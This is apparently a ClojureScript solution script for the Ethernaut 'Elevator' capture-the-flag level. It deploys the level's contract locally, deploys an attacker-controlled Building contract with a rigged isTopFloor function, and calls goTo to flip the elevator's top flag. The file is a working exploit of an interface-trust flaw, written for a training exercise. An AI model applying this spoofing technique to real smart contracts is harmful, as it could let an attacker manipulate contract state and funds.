(ns ctf.ethernaut.elevator
  "We have the definition of Elevator and an interface
  of Building. We can the implementation of Building
  contract that conforms to the given interface.
  Since we are provding the implementation we can alwalys
  return `false` from the `isTopFloor` function "
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]]))


(def player (w/get-player! w/local-provider))


(defn deploy-elevator!
  "The owner will deploy the elevator contract.
   Returns js/Promise."
  []
  (let [contract (u/contract :elevator w/local-wallet)]
    (.deploy contract)))


(defn deploy-building!
  "The player will deploy the Building contract
   with the malicious implementation for `isTopFloor` fn :smiling_imp:"
  []
  (let [contract (u/contract :building player)]
    (.deploy contract)))


(defn elevator-attack []
  (a/go
      (try
        (let [elevator (<p! (deploy-elevator!))
              building   (<p! (deploy-building!))]
          ;; Call `goTo` on building
          (<p! (.goTo building
                      (.-address elevator)
                      "100"
                      (js-obj "gasLimit" 2000000)))
          (<p! (.top elevator)))
        (catch js/Error err
          (js/console.log (ex-cause err))))))



(comment

  ;; Run this block to execute the attack
  (elevator-attack)


  (-> (u/compile-all!)
      (.then #(println :done))
      (.catch #(.log js/console %)))

  (do
    (def elevator (atom ""))

    (.then (deploy-elevator!)
           #(reset! elevator %)))

  (->
   (.top @elevator)
   (.then #(.log js/console %))
   (.catch #(.log js/console %)))


  (do
    (def building (atom ""))

    (-> (deploy-building!)
        (.then #(reset! building %))
        (.catch #(.log js/console %))))

  (->
   (.goTo @building
          "0x17E24ff3fe9fb0B84Af02F7D74391813E813F9aF"
          #_(.-address @elevator)
          "100"
          (js-obj
           "gasLimit"
           2000000))
   (.then #(.log js/console %))
   (.catch #(.log js/console %)))

  (->
   (.top @elevator)
   (.then #(.log js/console %))
   (.catch #(.log js/console %)))


  )
